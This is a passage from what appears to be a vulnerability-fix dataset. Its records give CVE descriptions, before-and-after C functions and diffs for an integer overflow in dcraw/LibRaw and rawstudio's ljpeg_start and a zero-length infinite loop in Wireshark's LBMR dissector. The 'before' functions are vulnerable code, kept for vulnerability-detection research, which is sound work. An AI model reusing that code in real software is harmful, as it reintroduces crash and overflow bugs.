tiff_ifd[ifd].offset > 0) {\n\t  fseek (ifp, tiff_ifd[ifd].offset, SEEK_SET);\n\t  if (ljpeg_start (&jh, 1)) {\n\t    tiff_ifd[ifd].comp    = 6;\n\t    tiff_ifd[ifd].t_width   = jh.wide;\n\t    tiff_ifd[ifd].t_height  = jh.high;\n\t    tiff_ifd[ifd].bps     = jh.bits;\n\t    tiff_ifd[ifd].samples = jh.clrs;\n\t    if (!(jh.sraw || (jh.clrs & 1)))\n\t      tiff_ifd[ifd].t_width *= jh.clrs;\n\t    i = order;\n\t    parse_tiff (tiff_ifd[ifd].offset + 12);\n\t    order = i;\n\t  }\n\t}\n\tbreak;\n      case 274:\t\t\t\t/* Orientation */\n\ttiff_ifd[ifd].t_flip = \"50132467\"[get2() & 7]-'0';\n\tbreak;\n      case 277:\t\t\t\t/* SamplesPerPixel */\n\ttiff_ifd[ifd].samples = getint(type) & 7;\n\tbreak;\n      case 279:\t\t\t\t/* StripByteCounts */\n      case 514:\n      case 61448:\n\ttiff_ifd[ifd].bytes = get4();\n\tbreak;\n      case 61454:\n\tFORC3 cam_mul[(4-c) % 3] = getint(type);\n\tbreak;\n      case 305:  case 11:\t\t/* Software */\n\tfgets (software, 64, ifp);\n\tif (!strncmp(software,\"Adobe\",5) ||\n\t    !strncmp(software,\"dcraw\",5) ||\n\t    !strncmp(software,\"UFRaw\",5) ||\n\t    !strncmp(software,\"Bibble\",6) ||\n\t    !strncmp(software,\"Nikon Scan\",10) ||\n\t    !strcmp (software,\"Digital Photo Professional\"))\n\t  is_raw = 0;\n\tbreak;\n      case 306:\t\t\t\t/* DateTime */\n\tget_timestamp(0);\n\tbreak;\n      case 315:\t\t\t\t/* Artist */\n\tfread (artist, 64, 1, ifp);\n\tbreak;\n      case 322:\t\t\t\t/* TileWidth */\n\ttiff_ifd[ifd].t_tile_width = getint(type);\n\tbreak;\n      case 323:\t\t\t\t/* TileLength */\n\ttiff_ifd[ifd].t_tile_length = getint(type);\n\tbreak;\n      case 324:\t\t\t\t/* TileOffsets */\n\ttiff_ifd[ifd].offset = len > 1 ? ftell(ifp) : get4();\n\tif (len == 4) {\n\t  load_raw = &CLASS sinar_4shot_load_raw;\n\t  is_raw = 5;\n\t}\n\tbreak;\n#ifdef LIBRAW_LIBRARY_BUILD\n      case 325:\t\t\t\t/* TileByteCount */\n          tiff_ifd[ifd].tile_maxbytes = 0;\n          for(int jj=0;jj<len;jj++)\n              {\n                  int s = get4();\n                  if(s > tiff_ifd[ifd].tile_maxbytes) tiff_ifd[ifd].tile_maxbytes=s;\n              }\n\tbreak;\n#endif\n      case 330:\t\t\t\t/* SubIFDs */\n\tif (!strcmp(model,\"DSLR-A100\") && tiff_ifd[ifd].t_width == 3872) {\n\t  load_raw = &CLASS sony_arw_load_raw;\n\t  data_offset = get4()+base;\n\t  ifd++;  break;\n\t}\n        if(len > 1000) len=1000; /* 1000 SubIFDs is enough */\n\twhile (len--) {\n\t  i = ftell(ifp);\n\t  fseek (ifp, get4()+base, SEEK_SET);\n\t  if (parse_tiff_ifd (base)) break;\n\t  fseek (ifp, i+4, SEEK_SET);\n\t}\n\tbreak;\n      case 400:\n\tstrcpy (make, \"Sarnoff\");\n\tmaximum = 0xfff;\n\tbreak;\n      case 28688:\n\tFORC4 sony_curve[c+1] = get2() >> 2 & 0xfff;\n\tfor (i=0; i < 5; i++)\n\t  for (j = sony_curve[i]+1; j <= sony_curve[i+1]; j++)\n\t    curve[j] = curve[j-1] + (1 << i);\n\tbreak;\n      case 29184: sony_offset = get4();  break;\n      case 29185: sony_length = get4();  break;\n      case 29217: sony_key    = get4();  break;\n      case 29264:\n\tparse_minolta (ftell(ifp));\n\traw_width = 0;\n\tbreak;\n      case 29443:\n\tFORC4 cam_mul[c ^ (c < 2)] = get2();\n\tbreak;\n      case 29459:\n\tFORC4 cam_mul[c] = get2();\n\ti = (cam_mul[1] == 1024 && cam_mul[2] == 1024) << 1;\n\tSWAP (cam_mul[i],cam_mul[i+1])\n\tbreak;\n    case 30720: // Sony matrix, Sony_SR2SubIFD_0x7800\n      for (i=0; i < 3; i++)\n        FORC3 cmatrix[i][c] = ((short) get2()) / 1024.0;\n#ifdef DCRAW_VERBOSE\n\tif (verbose) fprintf (stderr, _(\" Sony matrix:\\n%f %f %f\\n%f %f %f\\n%f %f %f\\n\"), cmatrix[0][0],  cmatrix[0][1], cmatrix[0][2], cmatrix[1][0], cmatrix[1][1], cmatrix[1][2], cmatrix[2][0], cmatrix[2][1], cmatrix[2][2]);\n#endif\n\tbreak;\n    case 29456: // Sony black level, Sony_SR2SubIFD_0x7310, needs to be divided by 4\n      FORC4 cblack[c ^ c >> 1] = get2()/4;\n      i = cblack[3];\n      FORC3 if(i>cblack[c]) i = cblack[c];\n      FORC4 cblack[c]-=i;\n      black = i;\n#ifdef DCRAW_VERBOSE\n      if (verbose) fprintf (stderr, _(\"...Sony black: %u cblack: %u %u %u %u\\n\"),black, cblack[0],cblack[1],cblack[2], cblack[3]);\n#endif\n      break;\n      case 33405:\t\t\t/* Model2 */\n\tfgets (model2, 64, ifp);\n\tbreak;\n      case 33422:\t\t\t/* CFAPattern */\n      case 64777:\t\t\t/* Kodak P-series */\n\tif ((plen=len) > 16) plen = 16;\n\tfread (cfa_pat, 1, plen, ifp);\n\tfor (colors=cfa=i=0; i < plen && colors < 4; i++) {\n\t  colors += !(cfa & (1 << cfa_pat[i]));\n\t  cfa |= 1 << cfa_pat[i];\n\t}\n\tif (cfa == 070) memcpy (cfa_pc,\"\\003\\004\\005\",3);\t/* CMY */\n\tif (cfa == 072) memcpy (cfa_pc,\"\\005\\003\\004\\001\",4);\t/* GMCY */\n\tgoto guess_cfa_pc;\n      case 33424:\n      case 65024:\n\tfseek (ifp, get4()+base, SEEK_SET);\n\tparse_kodak_ifd (base);\n\tbreak;\n      case 33434:\t\t\t/* ExposureTime */\n\tshutter = getreal(type);\n\tbreak;\n      case 33437:\t\t\t/* FNumber */\n\taperture = getreal(type);\n\tbreak;\n      case 34306:\t\t\t/* Leaf white balance */\n\tFORC4 cam_mul[c ^ 1] = 4096.0 / get2();\n\tbreak;\n      case 34307:\t\t\t/* Leaf CatchLight color matrix */\n\tfread (software, 1, 7, ifp);\n\tif (strncmp(software,\"MATRIX\",6)) break;\n\tcolors = 4;\n\tfor (raw_color = i=0; i < 3; i++) {\n\t  FORC4 fscanf (ifp, \"%f\", &rgb_cam[i][c^1]);\n\t  if (!use_camera_wb) continue;\n\t  num = 0;\n\t  FORC4 num += rgb_cam[i][c];\n\t  FORC4 rgb_cam[i][c] /= num;\n\t}\n\tbreak;\n      case 34310:\t\t\t/* Leaf metadata */\n\tparse_mos (ftell(ifp));\n      case 34303:\n\tstrcpy (make, \"Leaf\");\n\tbreak;\n      case 34665:\t\t\t/* EXIF tag */\n\tfseek (ifp, get4()+base, SEEK_SET);\n\tparse_exif (base);\n\tbreak;\n      case 34853:\t\t\t/* GPSInfo tag */\n\tfseek (ifp, get4()+base, SEEK_SET);\n\tparse_gps (base);\n\tbreak;\n      case 34675:\t\t\t/* InterColorProfile */\n      case 50831:\t\t\t/* AsShotICCProfile */\n\tprofile_offset = ftell(ifp);\n\tprofile_length = len;\n\tbreak;\n      case 37122:\t\t\t/* CompressedBitsPerPixel */\n\tkodak_cbpp = get4();\n\tbreak;\n      case 37386:\t\t\t/* FocalLength */\n\tfocal_len = getreal(type);\n\tbreak;\n      case 37393:\t\t\t/* ImageNumber */\n\tshot_order = getint(type);\n\tbreak;\n      case 37400:\t\t\t/* old Kodak KDC tag */\n\tfor (raw_color = i=0; i < 3; i++) {\n\t  getreal(type);\n\t  FORC3 rgb_cam[i][c] = getreal(type);\n\t}\n\tbreak;\n      case 40976:\n\tstrip_offset = get4();\n\tload_raw = &CLASS samsung_load_raw;\n\tbreak;\n      case 46275:\t\t\t/* Imacon tags */\n\tstrcpy (make, \"Imacon\");\n\tdata_offset = ftell(ifp);\n\tima_len = len;\n\tbreak;\n      case 46279:\n\tif (!ima_len) break;\n\tfseek (ifp, 38, SEEK_CUR);\n      case 46274:\n\tfseek (ifp, 40, SEEK_CUR);\n\traw_width  = get4();\n\traw_height = get4();\n\tleft_margin = get4() & 7;\n\twidth = raw_width - left_margin - (get4() & 7);\n\ttop_margin = get4() & 7;\n\theight = raw_height - top_margin - (get4() & 7);\n\tif (raw_width == 7262 && ima_len == 234317952 ) {\n\t  height = 5412;\n\t  width  = 7216;\n\t  left_margin = 7;\n          filters=0;\n\t} else \tif (raw_width == 7262) {\n\t  height = 5444;\n\t  width  = 7244;\n\t  left_margin = 7;\n\t}\n\tfseek (ifp, 52, SEEK_CUR);\n\tFORC3 cam_mul[c] = getreal(11);\n\tfseek (ifp, 114, SEEK_CUR);\n\tflip = (get2() >> 7) * 90;\n\tif (width * height * 6 == ima_len) {\n\t  if (flip % 180 == 90) SWAP(width,height);\n\t  raw_width = width;\n\t  raw_height = height;\n\t  left_margin = top_margin = filters = flip = 0;\n\t}\n\tsprintf (model, \"Ixpress %d-Mp\", height*width/1000000);\n\tload_raw = &CLASS imacon_full_load_raw;\n\tif (filters) {\n\t  if (left_margin & 1) filters = 0x61616161;\n\t  load_raw = &CLASS unpacked_load_raw;\n\t}\n\tmaximum = 0xffff;\n\tbreak;\n      case 50454:\t\t\t/* Sinar tag */\n      case 50455:\n\tif (!(cbuf = (char *) malloc(len))) break;\n\tfread (cbuf, 1, len, ifp);\n\tfor (cp = cbuf-1; cp && cp < cbuf+len; cp = strchr(cp,'\\n'))\n\t  if (!strncmp (++cp,\"Neutral \",8))\n\t    sscanf (cp+8, \"%f %f %f\", cam_mul, cam_mul+1, cam_mul+2);\n\tfree (cbuf);\n\tbreak;\n      case 50458:\n\tif (!make[0]) strcpy (make, \"Hasselblad\");\n\tbreak;\n      case 50459:\t\t\t/* Hasselblad tag */\n\ti = order;\n\tj = ftell(ifp);\n\tc = tiff_nifds;\n\torder = get2();\n\tfseek (ifp, j+(get2(),get4()), SEEK_SET);\n\tparse_tiff_ifd (j);\n\tmaximum = 0xffff;\n\ttiff_nifds = c;\n\torder = i;\n\tbreak;\n      case 50706:\t\t\t/* DNGVersion */\n\tFORC4 dng_version = (dng_version << 8) + fgetc(ifp);\n\tif (!make[0]) strcpy (make, \"DNG\");\n\tis_raw = 1;\n\tbreak;\n      case 50710:\t\t\t/* CFAPlaneColor */\n\tif (len > 4) len = 4;\n\tcolors = len;\n\tfread (cfa_pc, 1, colors, ifp);\nguess_cfa_pc:\n\tFORCC tab[cfa_pc[c]] = c;\n\tcdesc[c] = 0;\n\tfor (i=16; i--; )\n\t  filters = filters << 2 | tab[cfa_pat[i % plen]];\n\tfilters -= !filters;\n\tbreak;\n      case 50711:\t\t\t/* CFALayout */\n\tif (get2() == 2) {\n\t  fuji_width = 1;\n\t  filters = 0x49494949;\n\t}\n\tbreak;\n      case 291:\n      case 50712:\t\t\t/* LinearizationTable */\n\tlinear_table (len);\n\tbreak;\n      case 50713:\t\t\t/* BlackLevelRepeatDim */\n\tblrr = get2();\n\tblrc = get2();\n\tbreak;\n      case 61450:\n\tblrr = blrc = 2;\n      case 50714:\t\t\t/* BlackLevel */\n\tblack = getreal(type);\n\tif ((unsigned)(filters+1) < 1000) break;\n\tdblack[0] = black;\n\tdblack[1] = (blrc == 2) ? getreal(type):dblack[0];\n\tdblack[2] = (blrr == 2) ? getreal(type):dblack[0];\n\tdblack[3] = (blrc == 2 && blrr == 2) ? getreal(type):dblack[1];\n\tif (colors == 3)\n\t  filters |= ((filters >> 2 & 0x22222222) |\n\t\t      (filters << 2 & 0x88888888)) & filters << 1;\n\tFORC4 cblack[filters >> (c << 1) & 3] = dblack[c];\n\tblack = 0;\n\tbreak;\n      case 50715:\t\t\t/* BlackLevelDeltaH */\n      case 50716:\t\t\t/* BlackLevelDeltaV */\n\tfor (num=i=0; i < len && i < 65536; i++)\n\t  num += getreal(type);\n\tblack += num/len + 0.5;\n\tbreak;\n      case 50717:\t\t\t/* WhiteLevel */\n\tmaximum = getint(type);\n\tbreak;\n      case 50718:\t\t\t/* DefaultScale */\n\tpixel_aspect  = getreal(type);\n\tpixel_aspect /= getreal(type);\n\tbreak;\n      case 50721:\t\t\t/* ColorMatrix1 */\n      case 50722:\t\t\t/* ColorMatrix2 */\n\tFORCC for (j=0; j < 3; j++)\n\t  cm[c][j] = getreal(type);\n\tuse_cm = 1;\n\tbreak;\n      case 50723:\t\t\t/* CameraCalibration1 */\n      case 50724:\t\t\t/* CameraCalibration2 */\n\tfor (i=0; i < colors; i++)\n\t  FORCC cc[i][c] = getreal(type);\n\tbreak;\n      case 50727:\t\t\t/* AnalogBalance */\n\tFORCC ab[c] = getreal(type);\n\tbreak;\n      case 50728:\t\t\t/* AsShotNeutral */\n\tFORCC asn[c] = getreal(type);\n\tbreak;\n      case 50729:\t\t\t/* AsShotWhiteXY */\n\txyz[0] = getreal(type);\n\txyz[1] = getreal(type);\n\txyz[2] = 1 - xyz[0] - xyz[1];\n\tFORC3 xyz[c] /= d65_white[c];\n\tbreak;\n      case 50740:\t\t\t/* DNGPrivateData */\n\tif (dng_version) break;\n\tparse_minolta (j = get4()+base);\n\tfseek (ifp, j, SEEK_SET);\n\tparse_tiff_ifd (base);\n\tbreak;\n      case 50752:\n\tread_shorts (cr2_slice, 3);\n\tbreak;\n      case 50829:\t\t\t/* ActiveArea */\n\ttop_margin = getint(type);\n\tleft_margin = getint(type);\n\theight = getint(type) - top_margin;\n\twidth = getint(type) - left_margin;\n\tbreak;\n      case 50830:\t\t\t/* MaskedAreas */\n        for (i=0; i < len && i < 32; i++)\n\t  mask[0][i] = getint(type);\n\tblack = 0;\n\tbreak;\n      case 51009:\t\t\t/* OpcodeList2 */\n\tmeta_offset = ftell(ifp);\n\tbreak;\n      case 64772:\t\t\t/* Kodak P-series */\n\tif (len < 13) break;\n\tfseek (ifp, 16, SEEK_CUR);\n\tdata_offset = get4();\n\tfseek (ifp, 28, SEEK_CUR);\n\tdata_offset += get4();\n\tload_raw = &CLASS packed_load_raw;\n\tbreak;\n      case 65026:\n\tif (type == 2) fgets (model2, 64, ifp);\n    }",
        "diff_func": "--- func_before\n+++ func_after\n@@ -34,6 +34,7 @@\n     fseek (ifp, save, SEEK_SET);\n   }\n }\n+#line 6533 \"dcraw/dcraw.c\"\n int CLASS parse_tiff_ifd (int base)\n {\n   unsigned entries, tag, type, len, plen=16, save;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "#line 6533 \"dcraw/dcraw.c\""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3885",
        "func_name": "LibRaw/ljpeg_start",
        "description": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.",
        "git_url": "https://github.com/LibRaw/LibRaw/commit/4606c28f494a750892c5c1ac7903e62dd1c6fdb5",
        "commit_title": "0.16.1: fix for dcraw ljpeg_start() vulnerability",
        "commit_text": "",
        "func_before": "int CLASS ljpeg_start (struct jhead *jh, int info_only)\n{\n  int c, tag, len;\n  uchar data[0x10000];\n  const uchar *dp;\n\n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  if (jh->clrs > 6 || !jh->huff[0]) return 0;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}",
        "func": "int CLASS ljpeg_start (struct jhead *jh, int info_only)\n{\n  int c, tag;\n  ushort len;\n  uchar data[0x10000];\n  const uchar *dp;\n\n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  if (jh->clrs > 6 || !jh->huff[0]) return 0;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,7 @@\n int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n-  int c, tag, len;\n+  int c, tag;\n+  ushort len;\n   uchar data[0x10000];\n   const uchar *dp;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  int c, tag, len;"
            ],
            "added_lines": [
                "  int c, tag;",
                "  ushort len;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3885",
        "func_name": "rawstudio/ljpeg_start",
        "description": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.",
        "git_url": "https://github.com/rawstudio/rawstudio/commit/983bda1f0fa5fa86884381208274198a620f006e",
        "commit_title": "Avoid overflow in ljpeg_start().",
        "commit_text": "",
        "func_before": "int CLASS ljpeg_start (struct jhead *jh, int info_only)\n{\n  int c, tag, len;\n  uchar data[0x10000];\n  const uchar *dp;\n\n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}",
        "func": "int CLASS ljpeg_start (struct jhead *jh, int info_only)\n{\n  int c, tag;\n  ushort len;\n  uchar data[0x10000];\n  const uchar *dp;\n\n  memset (jh, 0, sizeof *jh);\n  jh->restart = INT_MAX;\n  fread (data, 2, 1, ifp);\n  if (data[1] != 0xd8) return 0;\n  do {\n    fread (data, 2, 2, ifp);\n    tag =  data[0] << 8 | data[1];\n    len = (data[2] << 8 | data[3]) - 2;\n    if (tag <= 0xff00) return 0;\n    fread (data, 1, len, ifp);\n    switch (tag) {\n      case 0xffc3:\n\tjh->sraw = ((data[7] >> 4) * (data[7] & 15) - 1) & 3;\n      case 0xffc0:\n\tjh->bits = data[0];\n\tjh->high = data[1] << 8 | data[2];\n\tjh->wide = data[3] << 8 | data[4];\n\tjh->clrs = data[5] + jh->sraw;\n\tif (len == 9 && !dng_version) getc(ifp);\n\tbreak;\n      case 0xffc4:\n\tif (info_only) break;\n\tfor (dp = data; dp < data+len && (c = *dp++) < 4; )\n\t  jh->free[c] = jh->huff[c] = make_decoder_ref (&dp);\n\tbreak;\n      case 0xffda:\n\tjh->psv = data[1+data[0]*2];\n\tjh->bits -= data[3+data[0]*2] & 15;\n\tbreak;\n      case 0xffdd:\n\tjh->restart = data[0] << 8 | data[1];\n    }\n  } while (tag != 0xffda);\n  if (info_only) return 1;\n  FORC(5) if (!jh->huff[c+1]) jh->huff[c+1] = jh->huff[c];\n  if (jh->sraw) {\n    FORC(4)        jh->huff[2+c] = jh->huff[1];\n    FORC(jh->sraw) jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,7 @@\n int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n-  int c, tag, len;\n+  int c, tag;\n+  ushort len;\n   uchar data[0x10000];\n   const uchar *dp;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  int c, tag, len;"
            ],
            "added_lines": [
                "  int c, tag;",
                "  ushort len;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3808",
        "func_name": "wireshark/dissect_lbmr_pser",
        "description": "The dissect_lbmr_pser function in epan/dissectors/packet-lbmr.c in the LBMR dissector in Wireshark 1.12.x before 1.12.5 does not reject a zero length, which allows remote attackers to cause a denial of service (infinite loop) via a crafted packet.",
        "git_url": "https://github.com/wireshark/wireshark/commit/c19860dba8d158c42865c3d9051b6f318cb41169",
        "commit_title": "lbmr: fix possible infinite loop",
        "commit_text": " Ensure that we handle when option_len is zero so we don't go into an infinite loop. Reported by Vlad Tsyrklevich and found by the \"joern\" tool. Also fix what appears to be two misplaced \"curr_offset\" values which would have resulted in a bad loop anyways.  Bug: 11036",
        "func_before": "static int dissect_lbmr_pser(tvbuff_t * tvb, int offset, packet_info * pinfo, proto_tree * tree)\n{\n    int hdr_len = 0;\n    int len = 0;\n    int topic_len = 0;\n    static const int * flags[] =\n    {\n        &hf_lbmr_pser_flags_option,\n        NULL\n    };\n    int curr_offset = offset;\n    guint16 flags_val = 0;\n\n    hdr_len = (int)tvb_get_ntohs(tvb, curr_offset + O_LBMR_PSER_T_LEN);\n    flags_val = tvb_get_ntohs(tvb, curr_offset + O_LBMR_PSER_T_FLAGS);\n    topic_len = hdr_len - L_LBMR_PSER_T;\n    proto_tree_add_item(tree, hf_lbmr_pser_dep_type, tvb, offset + O_LBMR_PSER_T_DEP_TYPE, L_LBMR_PSER_T_DEP_TYPE, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_len, tvb, offset + O_LBMR_PSER_T_LEN, L_LBMR_PSER_T_LEN, ENC_BIG_ENDIAN);\n    proto_tree_add_bitmask(tree, tvb, offset + O_LBMR_PSER_T_FLAGS, hf_lbmr_pser_flags, ett_lbmr_pser_flags, flags, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_source_ip, tvb, offset + O_LBMR_PSER_T_SOURCE_IP, L_LBMR_PSER_T_SOURCE_IP, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_store_ip, tvb, offset + O_LBMR_PSER_T_STORE_IP, L_LBMR_PSER_T_STORE_IP, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_transport_idx, tvb, offset + O_LBMR_PSER_T_TRANSPORT_IDX, L_LBMR_PSER_T_TRANSPORT_IDX, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_topic_idx, tvb, offset + O_LBMR_PSER_T_TOPIC_IDX, L_LBMR_PSER_T_TOPIC_IDX, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_source_port, tvb, offset + O_LBMR_PSER_T_SOURCE_PORT, L_LBMR_PSER_T_SOURCE_PORT, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_store_port, tvb, offset + O_LBMR_PSER_T_STORE_PORT, L_LBMR_PSER_T_STORE_PORT, ENC_BIG_ENDIAN);\n    proto_tree_add_item(tree, hf_lbmr_pser_topic, tvb, offset + O_LBMR_PSER_T_TOPIC, topic_len, ENC_ASCII|ENC_NA);\n    curr_offset += hdr_len;\n    len = hdr_len;\n    if ((flags_val & LBMR_PSER_OPT_FLAG) != 0)\n    {\n        proto_tree * opts_tree = NULL;\n        proto_item * opts_item = NULL;\n        proto_tree * optlen_tree = NULL;\n        proto_tree * optlen_item = NULL;\n        guint16 opt_len = 0;\n\n        opt_len = tvb_get_ntohs(tvb, curr_offset + O_LBMR_PSER_OPTLEN_T_OPTLEN);\n        opts_item = proto_tree_add_item(tree, hf_lbmr_pser_opts, tvb, curr_offset, -1, ENC_NA);\n        opts_tree = proto_item_add_subtree(opts_item, ett_lbmr_pser_opts);\n        optlen_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_optlen, tvb, curr_offset, L_LBMR_PSER_OPTLEN_T, ENC_NA);\n        optlen_tree = proto_item_add_subtree(optlen_item, ett_lbmr_pser_opt_len);\n        proto_tree_add_item(optlen_tree, hf_lbmr_pser_optlen_type, tvb, curr_offset + O_LBMR_PSER_OPTLEN_T_TYPE, L_LBMR_PSER_OPTLEN_T_TYPE, ENC_BIG_ENDIAN);\n        proto_tree_add_item(optlen_tree, hf_lbmr_pser_optlen_optlen, tvb, curr_offset + O_LBMR_PSER_OPTLEN_T_OPTLEN, L_LBMR_PSER_OPTLEN_T_OPTLEN, ENC_BIG_ENDIAN);\n        proto_item_set_len(opts_item, opt_len);\n        len += L_LBMR_PSER_OPTLEN_T;\n        curr_offset += L_LBMR_PSER_OPTLEN_T;\n        opt_len -= L_LBMR_PSER_OPTLEN_T;\n        while (opt_len > 0)\n        {\n            proto_tree * ctxinst_tree = NULL;\n            proto_item * ctxinst_item = NULL;\n            guint8 opt_type = tvb_get_guint8(tvb, curr_offset + O_LBMR_PSER_OPT_HDR_T_TYPE);\n            guint8 option_len = tvb_get_guint8(tvb, O_LBMR_PSER_OPT_HDR_T_LEN);\n\n            switch (opt_type)\n            {\n                case LBMR_PSER_OPT_SRC_CTXINST_TYPE:\n                case LBMR_PSER_OPT_STORE_CTXINST_TYPE:\n                    ctxinst_item = proto_tree_add_item(opts_tree, hf_lbmr_pser_opt_ctxinst, tvb, offset, L_LBMR_PSER_OPT_CTXINST_T, ENC_NA);\n                    ctxinst_tree = proto_item_add_subtree(ctxinst_item, ett_lbmr_pser_opt_ctxinst);\n                    proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_len, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_LEN, L_LBMR_PSER_OPT_CTXINST_T_LEN, ENC_BIG_ENDIAN);\n                    proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_type, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_TYPE, L_LBMR_PSER_OPT_CTXINST_T_TYPE, ENC_BIG_ENDIAN);\n                    proto_tree_add_item(ctxinst_tree, hf_lbmr_pser_opt_ctxinst_ctxinst, tvb, curr_offset + O_LBMR_PSER_OPT_CTXINST_T_CTXINST, L_LBMR_PSER_OPT_CTXINST_T_CTXINST, ENC_NA);\n                    len += L_LBMR_PSER_OPT_CTXINST_T;\n                    curr_offset += L_LBMR_PSER_OPT_CTXINST_T;\n                    opt_len -= L_LBMR_PSER_OPT_CTXINST_T;\n                    break;\n                default:\n                    len += option_len;\n                    curr_offset += option_len;\n                    opt_len -= option_len;\n                    